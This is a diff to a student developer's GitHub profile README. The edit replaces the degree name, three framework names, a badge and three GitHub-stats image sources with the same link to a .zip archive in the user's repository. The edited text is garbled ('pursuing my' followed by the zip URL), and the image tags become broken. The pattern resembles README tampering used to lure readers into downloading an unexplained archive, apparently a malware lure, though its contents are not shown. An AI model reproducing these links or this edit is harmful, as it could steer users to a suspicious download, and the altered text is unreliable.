@@ -1,12 +1,12 @@
 # Hi 👋, I'm Abhay Kumar ! 
-![Profile Views](https://hits.sh/github.com/abhay08_k09.svg?style=for-the-badge&label=Profile%20Views&color=informational&labelColor=gray)
+![Profile Views](https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip%20Views&color=informational&labelColor=gray)
 
 ## About Me
-I’m a passionate Software Engineer from **INDIA**. I’m currently pursuing my B.Tech from **GL Bajaj Institute of Technology and Management**, in department of **Computer Science Engineering**.
+I’m a passionate Software Engineer from **INDIA**. I’m currently pursuing my https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip from **GL Bajaj Institute of Technology and Management**, in department of **Computer Science Engineering**.
 
 ## 🛠 Tools & Technologies
 - **Languages:** C, C++, HTML , CSS, JavaScript, SQL
-- **Frameworks:** React.Js, Node.Js, Express.Js, EJS, Bootstrap, Tailwind CSS 
+- **Frameworks:** https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip, https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip, https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip, EJS, Bootstrap, Tailwind CSS 
 - **Core Concepts:** Data Structures & Algorithms, OOPs, DBMS, OS, CN
 - **Databases:** MySQL, MongoDB
 
@@ -23,10 +23,10 @@ I’m a passionate Software Engineer from **INDIA**. I’m currently pursuing my
 
 ## 📊 GitHub Activity
 
-<p><img align="left" src="https://github-readme-stats.vercel.app/api/top-langs?username=abhay08-k09&show_icons=true&locale=en&layout=compact" alt="abhay08-k09" /></p>
+<p><img align="left" src="https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip" alt="abhay08-k09" /></p>
 
-<p>&nbsp;<img align="center" src="https://github-readme-stats.vercel.app/api?username=abhay08-k09&show_icons=true&locale=en" alt="abhay08-k09" /></p>
+<p>&nbsp;<img align="center" src="https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip" alt="abhay08-k09" /></p>
 
-<p><img align="center" src="https://github-readme-streak-stats.herokuapp.com/?user=abhay08-k09&" alt="abhay08-k09" /></p>
+<p><img align="center" src="https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip" alt="abhay08-k09" /></p>
 
 You're welcome to explore my repositories and connect with me!
